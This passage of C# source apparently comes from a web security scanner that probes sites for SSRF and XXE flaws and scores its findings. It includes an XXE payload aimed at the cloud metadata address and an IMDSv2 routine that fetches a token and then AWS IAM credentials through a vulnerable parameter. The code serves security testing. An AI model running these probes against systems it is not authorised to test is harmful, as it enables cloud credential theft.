        return new SsrfDetectionResult(indicator, confidence, ClassifySeverity(indicator, confidence));
    }

    private static string ResolveMetadataConfidence(
        int status, bool looksLikeErrorPage, string cleaned, string cleanedBaseline)
    {
        if (looksLikeErrorPage || !HasStrongMetadataEvidence(cleaned, cleanedBaseline))
            return "likely";
        return status is >= 200 and < 300 ? "confirmed" : "likely";
    }

    /// <summary>
    /// Cloud metadata error JSON/HTML and reflected docs — not in-band credential leakage.
    /// </summary>
    private static bool LooksLikeMetadataNoisePage(string cleaned)
    {
        if (string.IsNullOrEmpty(cleaned)) return false;
        if (cleaned.Contains("InvalidMetadata", StringComparison.OrdinalIgnoreCase)
            || cleaned.Contains("Must be called with a Bearer token", StringComparison.OrdinalIgnoreCase)
            || cleaned.Contains("MetadataNotFound", StringComparison.OrdinalIgnoreCase)
            || cleaned.Contains("404 - Unknown", StringComparison.OrdinalIgnoreCase)
            || (cleaned.Contains("<Code>AccessDenied</Code>", StringComparison.OrdinalIgnoreCase)
                && cleaned.Contains("meta-data", StringComparison.OrdinalIgnoreCase)))
            return true;

        if (cleaned.Contains("latest/meta-data", StringComparison.OrdinalIgnoreCase)
            && (cleaned.Contains("documentation", StringComparison.OrdinalIgnoreCase)
                || cleaned.Contains("for example", StringComparison.OrdinalIgnoreCase)
                || cleaned.Contains("example request", StringComparison.OrdinalIgnoreCase)))
            return true;

        return false;
    }

    private static SsrfDetectionResult? DetectErrorBasedSsrfSignal(
        string cleaned, string cleanedBaseline, string payload, int status, int baselineStatus)
    {
        if (string.IsNullOrEmpty(cleaned)) return null;
        if (status < 400 && baselineStatus < 400) return null;

        if (HasAbsoluteSsrfErrorSignal(cleaned, payload))
        {
            return new SsrfDetectionResult("error-based-ssrf-signal", "likely",
                ClassifySeverity("error-based-ssrf-signal", "likely"));
        }

        var probeIps = ExtractInternalIps(cleaned);
        var baselineIps = ExtractInternalIps(cleanedBaseline);
        foreach (var ip in probeIps)
        {
            if (!baselineIps.Contains(ip))
                return new SsrfDetectionResult("error-based-ssrf-signal", "tentative",
                    ClassifySeverity("error-based-ssrf-signal", "tentative"));
        }

        var isFetchPayload = IsSsrfProbePayload(payload);

        if (isFetchPayload)
        {
            if (FetchStackTraceRegex.IsMatch(cleaned) && !FetchStackTraceRegex.IsMatch(cleanedBaseline))
                return new SsrfDetectionResult("error-based-ssrf-signal", "tentative",
                    ClassifySeverity("error-based-ssrf-signal", "tentative"));

            foreach (var rx in ErrorBasedSsrfRegexes)
            {
                if (!rx.IsMatch(cleaned)) continue;
                if (rx.IsMatch(cleanedBaseline) && status == baselineStatus && probeIps.Count <= baselineIps.Count)
                    continue;
                return new SsrfDetectionResult("error-based-ssrf-signal", "tentative",
                    ClassifySeverity("error-based-ssrf-signal", "tentative"));
            }

            foreach (var marker in FetchStackMarkers)
            {
                if (!ContainsNew(cleaned, cleanedBaseline, marker))
                    continue;
                return new SsrfDetectionResult("error-based-ssrf-signal", "tentative",
                    ClassifySeverity("error-based-ssrf-signal", "tentative"));
            }

            if (status != baselineStatus && status >= 400 &&
                cleaned.Length > cleanedBaseline.Length + 20)
            {
                return new SsrfDetectionResult("error-based-ssrf-signal", "tentative",
                    ClassifySeverity("error-based-ssrf-signal", "tentative"));
            }
        }

        return null;
    }

    /// <summary>
    /// Strong server-side fetch error without requiring baseline differential
    /// (discovery baselines often reproduce the same blocked-fetch error page).
    /// </summary>
    private static bool HasAbsoluteSsrfErrorSignal(string cleaned, string payload)
    {
        if (!IsSsrfProbePayload(payload)) return false;

        var hasInternalIp = ExtractInternalIps(cleaned).Count > 0;
        var hasFetchStack = FetchStackTraceRegex.IsMatch(cleaned);
        var hasBlockedFetch = ContainsBlockedFetchLanguage(cleaned);

        if (hasInternalIp && (hasFetchStack || hasBlockedFetch))
            return true;

        if (hasFetchStack && hasBlockedFetch)
            return true;

        foreach (var marker in FetchStackMarkers)
        {
            if (cleaned.Contains(marker, StringComparison.OrdinalIgnoreCase) && hasBlockedFetch)
                return true;
        }

        return false;
    }

    private static bool ContainsBlockedFetchLanguage(string cleaned) =>
        cleaned.Contains("blocked", StringComparison.OrdinalIgnoreCase) &&
        (cleaned.Contains("illegal activity", StringComparison.OrdinalIgnoreCase) ||
         cleaned.Contains("invalid", StringComparison.OrdinalIgnoreCase) &&
         cleaned.Contains("url", StringComparison.OrdinalIgnoreCase));

    private static bool IsSsrfProbePayload(string payload) =>
        IsInternalPayload(payload) ||
        payload.StartsWith("http", StringComparison.OrdinalIgnoreCase) ||
        payload.StartsWith("file:", StringComparison.OrdinalIgnoreCase) ||
        payload.StartsWith("gopher:", StringComparison.OrdinalIgnoreCase) ||
        payload.StartsWith("dict:", StringComparison.OrdinalIgnoreCase);

    private static HashSet<string> ExtractInternalIps(string text)
    {
        var set = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        if (string.IsNullOrEmpty(text)) return set;
        foreach (Match m in InternalIpInErrorRegex.Matches(text))
            set.Add(m.Value);
        return set;
    }

    private static string? DetectMetadataIndicator(string cleaned, string cleanedBaseline)
    {
        if (AwsAccessKeyRegex.IsMatch(cleaned) && !AwsAccessKeyRegex.IsMatch(cleanedBaseline))
            return "aws-metadata";

        if (ContainsNew(cleaned, cleanedBaseline, "AccessKeyId") &&
            ContainsNew(cleaned, cleanedBaseline, "SecretAccessKey"))
            return "aws-metadata";

        if (ContainsNew(cleaned, cleanedBaseline, "ami-id") &&
            ContainsNew(cleaned, cleanedBaseline, "instance-id"))
            return "aws-metadata";

        foreach (var (indicator, pattern) in MetadataPatterns)
        {
            if (ContainsNew(cleaned, cleanedBaseline, pattern))
                return indicator;
        }

        return null;
    }

    private static bool HasStrongMetadataEvidence(string cleaned, string cleanedBaseline) =>
        AwsAccessKeyRegex.IsMatch(cleaned) && !AwsAccessKeyRegex.IsMatch(cleanedBaseline) ||
        (ContainsNew(cleaned, cleanedBaseline, "AccessKeyId") &&
         ContainsNew(cleaned, cleanedBaseline, "SecretAccessKey")) ||
        (ContainsNew(cleaned, cleanedBaseline, "ami-id") &&
         ContainsNew(cleaned, cleanedBaseline, "instance-id")) ||
        ContainsNew(cleaned, cleanedBaseline, "computeMetadata");

    private static bool ContainsNew(string body, string baseline, string pattern) =>
        body.Contains(pattern, StringComparison.OrdinalIgnoreCase) &&
        !baseline.Contains(pattern, StringComparison.OrdinalIgnoreCase);

    private static string StripPayloadEchoes(string body, string payload)
    {
        if (string.IsNullOrEmpty(body)) return "";
        var s = body;

        void RemoveFragment(string? fragment)
        {
            if (string.IsNullOrWhiteSpace(fragment)) return;
            s = s.Replace(fragment, "", StringComparison.OrdinalIgnoreCase);
            s = s.Replace(Uri.EscapeDataString(fragment), "", StringComparison.OrdinalIgnoreCase);
        }

        RemoveFragment(payload);
        if (Uri.TryCreate(payload, UriKind.Absolute, out var uri))
        {
            RemoveFragment(uri.Host);
            RemoveFragment(uri.AbsolutePath);
            RemoveFragment(uri.PathAndQuery);
            RemoveFragment(uri.AbsoluteUri);
        }

        foreach (var frag in new[]
                 {
                     "/latest/meta-data/", "iam/security-credentials", "169.254.169.254", "127.0.0.1",
                     "localhost", "metadata.google.internal", "10.0.0.1", "192.168.", "172.16."
                 })
            RemoveFragment(frag);

        return s;
    }

    private static bool LooksLikeErrorPage(string body, int status)
    {
        if (status >= 400) return true;
        if (body.Contains("<title>Error", StringComparison.OrdinalIgnoreCase)) return true;
        if (body.Contains("Unrecognized target URL", StringComparison.OrdinalIgnoreCase)) return true;
        if (body.Contains("invalid redirect", StringComparison.OrdinalIgnoreCase)) return true;
        if (body.Contains("whitelabel error page", StringComparison.OrdinalIgnoreCase)) return true;
        if (body.Contains("InvalidMetadata", StringComparison.OrdinalIgnoreCase)) return true;
        if (Regex.IsMatch(body, @"Error:\s*(Unrecognized|Invalid|Forbidden|Not allowed|Not Acceptable)",
                RegexOptions.IgnoreCase))
            return true;
        return false;
    }

    private static bool IsPayloadUrlReflection(string body, string payload)
    {
        if (string.IsNullOrEmpty(payload)) return false;
        if (!body.Contains(payload, StringComparison.OrdinalIgnoreCase))
            return false;
        return StripPayloadEchoes(body, payload).Length < Math.Min(80, body.Length / 4);
    }

    private static bool IsInternalPayload(string payload) =>
        payload.Contains("127.0.0.1", StringComparison.Ordinal) ||
        payload.Contains("localhost", StringComparison.OrdinalIgnoreCase) ||
        payload.Contains("169.254.169.254", StringComparison.Ordinal) ||
        payload.Contains("metadata", StringComparison.OrdinalIgnoreCase) ||
        payload.Contains("10.0.0.1", StringComparison.Ordinal) ||
        payload.Contains("192.168.", StringComparison.Ordinal) ||
        payload.Contains("172.16.", StringComparison.Ordinal);

    private static bool IsHttpUrlPayload(string payload) =>
        payload.StartsWith("http://", StringComparison.OrdinalIgnoreCase)
        || payload.StartsWith("https://", StringComparison.OrdinalIgnoreCase);

    /// <summary>True when body looks like a full remote HTML document (not a JSON API envelope).</summary>
    private static bool LooksLikeFetchedHtmlDocument(string body)
    {
        if (string.IsNullOrWhiteSpace(body) || body.Length < 40) return false;
        var t = body.TrimStart();
        if (t.StartsWith('{') || t.StartsWith('['))
        {
            // JSON envelopes that embed HTML (common SSRF lab pattern)
            return t.Contains("<html", StringComparison.OrdinalIgnoreCase)
                   || t.Contains("<!doctype", StringComparison.OrdinalIgnoreCase)
                   || (t.Contains("<title", StringComparison.OrdinalIgnoreCase)
                       && t.Contains("</title>", StringComparison.OrdinalIgnoreCase));
        }

        return t.StartsWith("<!DOCTYPE", StringComparison.OrdinalIgnoreCase)
               || t.StartsWith("<html", StringComparison.OrdinalIgnoreCase)
               || (body.Contains("<html", StringComparison.OrdinalIgnoreCase)
                   && body.Contains("<title", StringComparison.OrdinalIgnoreCase));
    }

    private static string? ExtractHostFromPayload(string payload)
    {
        if (!Uri.TryCreate(payload, UriKind.Absolute, out var uri))
            return null;
        return uri.Host;
    }

    private static string ClassifySeverity(string indicator, string confidence)
    {
        var baseSeverity = indicator switch
        {
            "aws-metadata" or "aws-imdsv2-metadata" or "gcp-metadata" or "azure-metadata" or "do-metadata"
                or "alibaba-metadata" or "oracle-metadata" or "file-disclosure"
                or "xxe-file-disclosure" or "xxe-file-disclosure-winini" => "critical",
            "internal-host-reflected" or "dom-ssrf-callback" or "server-callback"
                or "external-content-fetched" => "high",
            // connection-error-leak is common noise (DNS/refused on many internal probes) — keep low
            // so confirmed metadata/file SSRF remains visible in auto-scan rollups.
            "connection-error-leak" => "low",
            "status-anomaly-internal" or "response-size-anomaly"
                or "error-based-ssrf-signal"
                or "xxe-parser-error-leak" or "xxe-status-anomaly" => "medium",
            _ => "medium"
        };

        return confidence switch
        {
            "confirmed" => baseSeverity,
            "likely" => baseSeverity switch
            {
                "critical" => "high",
                "high" => "medium",
                _ => baseSeverity
            },
            "tentative" => baseSeverity switch
            {
                "critical" => "medium",
                "high" => "low",
                _ => "low"
            },
            _ => baseSeverity
        };
    }

    private static int ConfidenceRank(string confidence) => confidence switch
    {
        "confirmed" => 3,
        "likely" => 2,
        "tentative" => 1,
        _ => 0
    };

    private static int SeverityRank(string s) => s switch
    {
        "critical" => 4, "high" => 3, "medium" => 2, "low" => 1, _ => 0
    };

    private static string? ExtractProbeId(string url)
    {
        if (!Uri.TryCreate(url, UriKind.Absolute, out var uri))
            return null;

        var path = uri.AbsolutePath;
        var pathStart = path.LastIndexOf("/probe-", StringComparison.OrdinalIgnoreCase);
        if (pathStart < 0) return null;
        var probePath = path[(pathStart + 1)..];
        var qIdx = probePath.IndexOf('?');
        return qIdx >= 0 ? probePath[..qIdx] : probePath;
    }

    private async Task<SsrfResult> RunXxeModeAsync(SsrfOptions options)
    {
        var findings = new List<SsrfFinding>();
        var correlationMap = new Dictionary<string, SsrfProbeContext>(StringComparer.OrdinalIgnoreCase);
        var detector = options.IncludeCallbackProbes ? PrepareCallbackDetector(options, correlationMap) : null;

        var currentUrl = await _ctx.GetCurrentUrl();
        if (string.IsNullOrEmpty(currentUrl) || !Uri.TryCreate(currentUrl, UriKind.Absolute, out var currentUri))
            throw new InvalidOperationException("Navigate to a page before running SSRF tests.");

        var origin = currentUri.GetLeftPart(UriPartial.Authority);
        var candidates = DiscoverXxeCandidates(_ctx.Network.Entries, origin, options.MaxCandidates);

        if (options.RequestTemplate != null && IsXmlRequest(options.RequestTemplate))
            candidates.Insert(0, XxeCandidate.FromTemplate(options.RequestTemplate));

        if (candidates.Count == 0)
            return new SsrfResult { CandidatesProbed = 0, PayloadsSent = 0, Findings = findings };

        var payloads = ResolveXxePayloads(options, detector);
        var timeout = options.TimeoutMs > 0 ? options.TimeoutMs : 15000;
        var payloadsSent = 0;

        _log($"SSRF(xxe): {candidates.Count} XML endpoint(s) × {payloads.Count} payload(s)", "#888888");

        foreach (var cand in candidates)
        {
            var baselineBody = cand.BaselineBody ?? "<foo>1</foo>";
            var (baseStatus, baseBody) = await FetchAsync(cand.Url, cand.Method, cand.Headers, baselineBody, timeout);
            if (baseStatus == 0 && string.IsNullOrEmpty(baseBody))
            {
                _log($"  XXE baseline failed {cand.Url}", "#CCA700");
                continue;
            }

            foreach (var payload in payloads)
            {
                var body = cand.HasBodyMarker
                    ? RequestMarkerSubstitute.ReplaceAll(cand.BodyTemplate ?? baselineBody, payload)
                    : payload;

                await ProbeXxeAndAnalyzeAsync(cand.Url, cand.Method, cand.Headers, body, payload,
                    baseStatus, baseBody, timeout, findings);
                payloadsSent++;
            }

            if (options.IncludeCallbackProbes && detector != null)
            {
                var probeUrl = detector.GenerateProbeUrl("xxe");
                TrackCorrelation(correlationMap, probeUrl, cand.Url, cand.Method, "(xxe-body)", probeUrl);
                var callbackPayload =
                    $"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"{probeUrl}\">]><foo>&xxe;</foo>";
                await ProbeXxeAndAnalyzeAsync(cand.Url, cand.Method, cand.Headers, callbackPayload, callbackPayload,
                    baseStatus, baseBody, timeout, findings);
                payloadsSent++;
            }
        }

        await CollectCallbackFindingsAsync(detector, correlationMap, findings, options.CallbackWaitMs);
        return new SsrfResult
        {
            CandidatesProbed = candidates.Count,
            PayloadsSent = payloadsSent,
            Findings = findings
        };
    }

    private async Task ProbeXxeAndAnalyzeAsync(
        string url, string method, Dictionary<string, string>? headers, string body, string payload,
        int baseStatus, string? baseBody, int timeout, List<SsrfFinding> findings)
    {
        int status;
        string respBody;
        try
        {
            (status, respBody) = await FetchAsync(url, method, headers, body, timeout);
        }
        catch (Exception ex)
        {
            _log($"  XXE fetch failed {url}: {ex.Message}", "#CCA700");
            return;
        }

        var detection = DetectXxeIndicator(payload, respBody, baseBody, baseStatus, status);
        TryAddFinding(findings, detection, "xxe-in-band", url, method, "(xxe-body)", payload, status, baseStatus, respBody);
    }

    private static List<string> ResolveXxePayloads(SsrfOptions options, CallbackDetector? detector)
    {
        if (options.XxePayloads is { Count: > 0 })
            return options.XxePayloads;

        var list = new List<string>();
        foreach (var p in FuzzerPayloads.BuiltIn["xxe"])
        {
            if (p.Contains("evil.com", StringComparison.OrdinalIgnoreCase))
                continue;
            if (p.Contains("expect://", StringComparison.OrdinalIgnoreCase))
                continue;
            list.Add(p);
        }

        if (options.IncludeInternalIps &&
            !list.Any(p => p.Contains("169.254.169.254", StringComparison.Ordinal)))
        {
            list.Add("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>");
        }

        return list.Distinct(StringComparer.Ordinal).ToList();
    }

    private static SsrfDetectionResult? DetectXxeIndicator(
        string payload, string body, string? baseline, int status, int baselineStatus)
    {
        var ssrf = DetectSsrfIndicator(payload, body, baseline, status, baselineStatus);
        if (ssrf != null) return ssrf;

        var cleaned = StripPayloadEchoes(body, payload);
        var cleanedBaseline = string.IsNullOrEmpty(baseline) ? "" : StripPayloadEchoes(baseline, payload);
        var looksLikeErrorPage = LooksLikeErrorPage(body, status);

        var disclosure = PathTraversalChecker.DetectDisclosure(cleaned, cleanedBaseline, payload);
        if (disclosure != null)
        {
            var indicator = disclosure switch
            {
                "win.ini-pattern" => "xxe-file-disclosure-winini",
                _ => "xxe-file-disclosure"
            };
            return FileDisclosureResult(indicator, disclosure, status, looksLikeErrorPage);
        }

        foreach (var err in new[] { "SAXParseException", "XMLSyntaxError", "simplexml_load_string", "XmlException",
                     "DOCTYPE is disallowed", "External entity", "libxml", "expat", "lxml.etree" })
        {
            if (!ContainsNew(cleaned, cleanedBaseline, err))
                continue;
            if (status >= 400 && looksLikeErrorPage)
                return null;
            var confidence = status >= 400 ? "tentative" : "likely";
            return new SsrfDetectionResult("xxe-parser-error-leak", confidence,
                ClassifySeverity("xxe-parser-error-leak", confidence));
        }

        if (status != baselineStatus && payload.Contains("<!ENTITY", StringComparison.OrdinalIgnoreCase))
        {
            if (status >= 400 && looksLikeErrorPage)
                return null;
            var confidence = status is >= 200 and < 300 ? "likely" : "tentative";
            return new SsrfDetectionResult("xxe-status-anomaly", confidence,
                ClassifySeverity("xxe-status-anomaly", confidence));
        }

        return null;
    }

    private static bool IsXmlRequest(SsrfRequestTemplate tpl)
    {
        if (tpl.Headers != null)
        {
            foreach (var (k, v) in tpl.Headers)
            {
                if (k.Equals("Content-Type", StringComparison.OrdinalIgnoreCase) &&
                    v.Contains("xml", StringComparison.OrdinalIgnoreCase))
                    return true;
            }
        }

        var body = tpl.Body?.TrimStart();
        return body != null && (body.StartsWith("<?xml", StringComparison.OrdinalIgnoreCase) ||
                                body.StartsWith('<') && body.Contains("</"));
    }

    private static List<XxeCandidate> DiscoverXxeCandidates(
        List<NetworkEntry> entries, string origin, int maxCandidates)
    {
        var list = new List<XxeCandidate>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var e in entries)
        {
            if (e.Method is not ("POST" or "PUT" or "PATCH"))
                continue;
            if (e.StatusCode is < 200 or >= 500)
                continue;
            if (!Uri.TryCreate(e.Url, UriKind.Absolute, out var uri))
                continue;
            if (!string.Equals(uri.GetLeftPart(UriPartial.Authority), origin, StringComparison.OrdinalIgnoreCase))
                continue;

            var ct = GetContentType(e);
            if (!IsXmlContentType(ct) && !LooksLikeXmlBody(e.RequestBody))
                continue;

            var key = $"{e.Method}|{e.Url}";
            if (!seen.Add(key)) continue;

            list.Add(XxeCandidate.FromNetworkEntry(e));
            if (list.Count >= maxCandidates) break;
        }

        return list;
    }

    private static string GetContentType(NetworkEntry e) =>
        e.RequestHeaders.TryGetValue("Content-Type", out var h) ? h :
        e.RequestHeaders.TryGetValue("content-type", out var h2) ? h2 : "";

    private static bool IsXmlContentType(string ct) =>
        ct.Contains("xml", StringComparison.OrdinalIgnoreCase) ||
        ct.Contains("application/soap", StringComparison.OrdinalIgnoreCase);

    private static bool LooksLikeXmlBody(string? body)
    {
        if (string.IsNullOrWhiteSpace(body)) return false;
        var t = body.TrimStart();
        return t.StartsWith("<?xml", StringComparison.OrdinalIgnoreCase) ||
               (t.StartsWith('<') && t.Contains("</"));
    }

    private sealed class XxeCandidate
    {
        public string Url { get; init; } = "";
        public string Method { get; init; } = "POST";
        public Dictionary<string, string>? Headers { get; init; }
        public string? BaselineBody { get; init; }
        public string? BodyTemplate { get; init; }
        public bool HasBodyMarker { get; init; }

        public static XxeCandidate FromNetworkEntry(NetworkEntry e)
        {
            var headers = e.RequestHeaders.Count > 0
                ? new Dictionary<string, string>(e.RequestHeaders, StringComparer.OrdinalIgnoreCase)
                : new Dictionary<string, string> { ["Content-Type"] = "application/xml" };

            if (!headers.Keys.Any(k => k.Equals("Content-Type", StringComparison.OrdinalIgnoreCase)))
                headers["Content-Type"] = "application/xml";

            return new XxeCandidate
            {
                Url = e.Url,
                Method = e.Method,
                Headers = headers,
                BaselineBody = string.IsNullOrWhiteSpace(e.RequestBody) ? "<foo>1</foo>" : e.RequestBody
            };
        }

        public static XxeCandidate FromTemplate(SsrfRequestTemplate tpl)
        {
            var headers = tpl.Headers is { Count: > 0 }
                ? new Dictionary<string, string>(tpl.Headers, StringComparer.OrdinalIgnoreCase)
                : new Dictionary<string, string> { ["Content-Type"] = "application/xml" };

            if (!headers.Keys.Any(k => k.Equals("Content-Type", StringComparison.OrdinalIgnoreCase)))
                headers["Content-Type"] = "application/xml";

            var body = tpl.Body ?? "<foo>1</foo>";
            var markers = RequestMarkerSubstitute.ListMarkers(tpl.Url, body);
            return new XxeCandidate
            {
                Url = tpl.Url,
                Method = tpl.Method,
                Headers = headers,
                BaselineBody = body,
                BodyTemplate = body,
                HasBodyMarker = markers.Count > 0
            };
        }
    }

    private static List<string> ResolveAllowedOrigins(Uri currentUri, List<string>? allowedHosts)
    {
        var origins = new List<string>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        void AddOrigin(string? value)
        {
            if (string.IsNullOrWhiteSpace(value)) return;
            var trimmed = value.Trim();
            if (!trimmed.StartsWith("http://", StringComparison.OrdinalIgnoreCase) &&
                !trimmed.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            {
                trimmed = $"{currentUri.Scheme}://{trimmed.TrimStart('/')}";
            }

            if (!Uri.TryCreate(trimmed, UriKind.Absolute, out var uri)) return;
            var origin = uri.GetLeftPart(UriPartial.Authority);
            if (seen.Add(origin))
                origins.Add(origin);
        }

        AddOrigin(currentUri.GetLeftPart(UriPartial.Authority));
        if (allowedHosts is { Count: > 0 })
        {
            foreach (var host in allowedHosts)
                AddOrigin(host);
        }

        return origins;
    }

    private static List<SsrfCandidate> BuildScaffoldCandidates(string origin, int max)
    {
        var list = new List<SsrfCandidate>();
        var baseOrigin = origin.TrimEnd('/');

        foreach (var path in ScaffoldPaths)
        {
            if (!Uri.TryCreate(baseOrigin + path, UriKind.Absolute, out var uri))
                continue;

            foreach (var param in ScaffoldParamNames)
            {
                list.Add(new SsrfCandidate(uri, param, "", "GET", null));
                if (list.Count >= max) return list;
            }
        }

        return list;
    }

    private async Task<List<SsrfCandidate>> FilterScaffoldCandidatesAsync(
        List<SsrfCandidate> scaffold, int timeout)
    {
        var filtered = new List<SsrfCandidate>();
        var pathExists = new Dictionary<string, bool>(StringComparer.OrdinalIgnoreCase);

        foreach (var cand in scaffold)
        {
            var pathKey = cand.BaselineUrl.Split('?')[0];
            if (!pathExists.TryGetValue(pathKey, out var exists))
            {
                var (status, _) = await FetchAsync(cand.BaselineUrl, cand.Method, cand.Headers, cand.BaselineBody, timeout);
                exists = status != 404;
                pathExists[pathKey] = exists;
            }

            if (exists)
                filtered.Add(cand);
        }

        return filtered;
    }

    private async Task<int> ProbeCloudMetadataHeadersAsync(
        SsrfCandidate cand, int baseStatus, string? baseBody, int timeout, List<SsrfFinding> findings)
    {
        var sent = 0;

        var gcpUrl = cand.BuildUrl(GcpMetadataUrl);
        var gcpBody = cand.BuildBody(GcpMetadataUrl);
        await ProbeAndAnalyzeAsync(gcpUrl, cand.Method, cand.Headers, gcpBody, GcpMetadataUrl, cand.ParamName,
            baseStatus, baseBody, timeout, findings,
            new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase) { ["Metadata-Flavor"] = "Google" });
        sent++;

        var azureUrl = cand.BuildUrl(AzureMetadataUrl);
        var azureBody = cand.BuildBody(AzureMetadataUrl);
        await ProbeAndAnalyzeAsync(azureUrl, cand.Method, cand.Headers, azureBody, AzureMetadataUrl, cand.ParamName,
            baseStatus, baseBody, timeout, findings,
            new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase) { ["Metadata"] = "true" });
        sent++;

        return sent;
    }

    private async Task<int> AttemptImdsV2PivotAsync(
        SsrfCandidate cand, int baseStatus, string? baseBody, int timeout, List<SsrfFinding> findings)
    {
        var tokenHeaders = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["X-aws-ec2-metadata-token-ttl-seconds"] = "21600"
        };

        var tokenUrl = cand.BuildUrl(AwsImdsV2TokenUrl);
        var tokenBody = cand.BuildBody(AwsImdsV2TokenUrl);

        int tokenStatus;
        string tokenResp;
        try
        {
            (tokenStatus, tokenResp) = await FetchAsync(
                tokenUrl, cand.Method, MergeHeaders(cand.Headers, tokenHeaders), tokenBody, timeout);
        }
        catch (Exception ex)
        {
            _log($"  IMDSv2 token fetch failed {tokenUrl}: {ex.Message}", "#CCA700");
            return 1;
        }

        var safeToken = SanitizeImdsToken(tokenResp);
        if (tokenStatus is not (>= 200 and < 300) || string.IsNullOrEmpty(safeToken))
            return 1;

        var credsHeaders = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["X-aws-ec2-metadata-token"] = safeToken
        };

        var credsUrl = cand.BuildUrl(AwsImdsV2CredsUrl);
        var credsBody = cand.BuildBody(AwsImdsV2CredsUrl);
        var beforeCount = findings.Count;
        await ProbeAndAnalyzeAsync(credsUrl, cand.Method, cand.Headers, credsBody, AwsImdsV2CredsUrl, cand.ParamName,
            baseStatus, baseBody, timeout, findings, credsHeaders);

        if (findings.Count > beforeCount)
            RelabelImdsV2Finding(findings, credsUrl, cand.ParamName);

        return 2;
    }

    private void RelabelImdsV2Finding(List<SsrfFinding> findings, string url, string paramName)
    {
        for (var i = findings.Count - 1; i >= 0; i--)
        {
            var f = findings[i];
            if (!f.Url.Equals(url, StringComparison.OrdinalIgnoreCase) ||
                !f.ParamName.Equals(paramName, StringComparison.OrdinalIgnoreCase))
                continue;

            if (f.Indicator is not ("aws-metadata" or "aws-imdsv2-metadata"))
                continue;

            _log($"  IMDSv2 pivot confirmed on {paramName}", "#F44747");
            findings[i] = new SsrfFinding
            {
                Type = f.Type,
                Severity = "critical",
                Confidence = f.Confidence,
                Url = f.Url,
                Method = f.Method,
                ParamName = f.ParamName,
                Payload = f.Payload,
                Status = f.Status,
                BaselineStatus = f.BaselineStatus,
                Indicator = "aws-imdsv2-metadata",
                Snippet = f.Snippet,
                CorrelationId = f.CorrelationId,
                Occurrences = f.Occurrences,
                PayloadVariants = f.PayloadVariants
            };
            break;
        }
    }

    private static string? SanitizeImdsToken(string? raw)
    {
        if (string.IsNullOrWhiteSpace(raw)) return null;
        var token = raw.Trim();
        var safe = new string(token.Where(c => char.IsLetterOrDigit(c) || c is '-' or '_' or '.' or '=').Take(256).ToArray());
        return safe.Length >= 8 ? safe : null;
    }

    private static Dictionary<string, string>? MergeHeaders(
        Dictionary<string, string>? baseHeaders, Dictionary<string, string>? extra)
    {
        if (extra == null || extra.Count == 0) return baseHeaders;
        var merged = baseHeaders != null
            ? new Dictionary<string, string>(baseHeaders, StringComparer.OrdinalIgnoreCase)
            : new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        foreach (var (k, v) in extra)
            merged[k] = v;
        return merged;
    }

    private static List<SsrfCandidate> PrioritizeSsrfCandidates(
        List<SsrfCandidate> explicitUrls,
        List<SsrfCandidate> hints,
        List<SsrfCandidate> network,
        List<SsrfCandidate> dom,
        List<SsrfCandidate> scaffold,
        int max)
    {
        var chosen = new List<SsrfCandidate>(max);
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        void Merge(IEnumerable<SsrfCandidate> src)
        {
            foreach (var c in src)
            {
                if (chosen.Count >= max) return;
                var key = $"{c.Method}|{c.BaselineUrl}|{c.ParamName}";
                if (!seen.Add(key)) continue;
                chosen.Add(c);
            }
        }

        Merge(explicitUrls);
        Merge(hints);
        Merge(network);
        Merge(dom);
        Merge(scaffold);
        return chosen
            .GroupBy(c => $"{c.Method}|{c.BaselineUrl}|{c.ParamName}", StringComparer.OrdinalIgnoreCase)
            .Select(g => g.OrderByDescending(c => c.HasBodyInjection).First())
            .Take(max)
            .ToList();
    }

    private static List<SsrfCandidate> BuildCandidatesFromUrls(
        List<string> urls, HashSet<string> paramNames, int maxCandidates)
    {
        var list = new List<SsrfCandidate>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var url in urls)
        {
            if (!Uri.TryCreate(url, UriKind.Absolute, out var uri))
                continue;
            foreach (var c in ExtractQueryCandidates(uri, paramNames))
            {
                var key = $"{c.Method}|{c.BaselineUrl}|{c.ParamName}";
                if (!seen.Add(key)) continue;
                list.Add(c);
                if (list.Count >= maxCandidates) return list;
            }
        }

        return list;
    }

    private static List<SsrfCandidate> BuildCandidatesFromHints(
        List<EndpointParamHint>? hints, HashSet<string> paramNames, int max)
    {
        if (hints == null || max <= 0) return [];
        var list = new List<SsrfCandidate>();
        foreach (var hint in hints)
        {
            if (!Uri.TryCreate(hint.Url, UriKind.Absolute, out var uri)) continue;
            foreach (var param in hint.ParamNames)
            {
                if (!UrlLikeParamNames.IsUrlLikeParam(param, "", paramNames)) continue;

                var method = string.IsNullOrWhiteSpace(hint.Method) ? "GET" : hint.Method;
                if (method is "POST" or "PUT" or "PATCH")
                {
                    list.Add(SsrfCandidate.FromHintBody(uri, param, method, hint));
                }
                else
                {
                    list.Add(new SsrfCandidate(uri, param, "", method, null));
                }

                if (list.Count >= max) return list;
            }
        }
        return list;
    }

    private static List<SsrfCandidate> DiscoverCandidates(
        List<NetworkEntry> entries, string origin, HashSet<string> paramNames, int maxCandidates)
    {
        var list = new List<SsrfCandidate>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var e in entries)
        {
            if (e.StatusCode is < 200 or >= 500)
                continue;
            if (!Uri.TryCreate(e.Url, UriKind.Absolute, out var uri))
                continue;
            if (!string.Equals(uri.GetLeftPart(UriPartial.Authority), origin, StringComparison.OrdinalIgnoreCase))
                continue;

            foreach (var c in ExtractQueryCandidates(uri, paramNames))
            {
                var key = $"{c.Method}|{c.BaselineUrl}|{c.ParamName}";
                if (!seen.Add(key)) continue;
                list.Add(c);
                if (list.Count >= maxCandidates) return list;
            }

            if (e.Method is "POST" or "PUT" or "PATCH" && !string.IsNullOrEmpty(e.RequestBody))
